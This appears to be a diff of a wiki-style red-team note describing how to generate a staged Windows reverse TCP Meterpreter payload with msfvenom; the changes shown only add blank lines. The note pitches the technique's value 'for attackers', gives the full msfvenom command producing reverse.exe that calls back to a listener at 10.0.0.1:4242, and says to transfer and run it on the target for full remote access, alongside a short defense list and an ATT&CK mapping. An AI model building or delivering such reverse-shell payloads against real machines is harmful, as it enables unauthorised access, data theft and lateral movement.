@@ -38,11 +38,15 @@ Technical Explanation: This procedure involves using a staged reverse TCP Meterp
 
 Business Value: This procedure is useful for attackers who want to gain access to a target machine that is behind a firewall or other network security measures. By using a staged reverse TCP Meterpreter shell, the attacker can bypass these measures and gain full access to the target machine, allowing them to steal data, install malware, and pivot to other machines on the network.
 
+ 
+
 ## Requirements
 
 1. Access to a machine that can run the Metasploit Framework
 
 1. Knowledge of the target's network architecture
+
+ 
 
 ## Defense
 
@@ -52,6 +56,8 @@ Business Value: This procedure is useful for attackers who want to gain access t
 
 1. Regularly monitor network traffic for signs of suspicious activity
 
+ 
+
 ## Objectives
 
 1. Establish a connection with the target machine
@@ -60,19 +66,31 @@ Business Value: This procedure is useful for attackers who want to gain access t
 
 1. Gain full access to the target machine
 
+ 
+
 # Instructions
 
 1. The 'msfvenom' command is used to generate payloads for various exploits. In this case, we are generating a payload for the 'windows/meterpreter/reverse_tcp' exploit. The 'LHOST' option specifies the IP address of the listener, and the 'LPORT' option specifies the port number. The '-f' option specifies the output format, which in this case is 'exe'. The output is then redirected to a file named 'reverse.exe'.
 
+ 
+
+
+
 **Code**: [[msfvenom -p windows/meterpreter/reverse_tcp LHOST=]]
 
+
+
 > This command generates a Windows executable payload that can be used to establish a reverse TCP connection to a listener. The payload can be used in conjunction with a Metasploit listener to gain remote access to a target machine. The 'LHOST' and 'LPORT' options should be set to the IP address and port number of the listener respectively. The generated payload should be transferred to the target machine and executed to establish the reverse TCP connection.
+
+
 
 **Command** ([[Create Windows Reverse TCP Meterpreter Payload]]):
 
 ```bash
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f exe > reverse.exe
 ```
+
+
 
 ## MITRE ATT&CK Mapping
 
@@ -99,3 +117,5 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f exe > r
 - [[Meterpreter Shell]]
 - [[Reverse Shell Cheat Sheet]]
 - [[Windows Staged reverse TCP]]
+
+
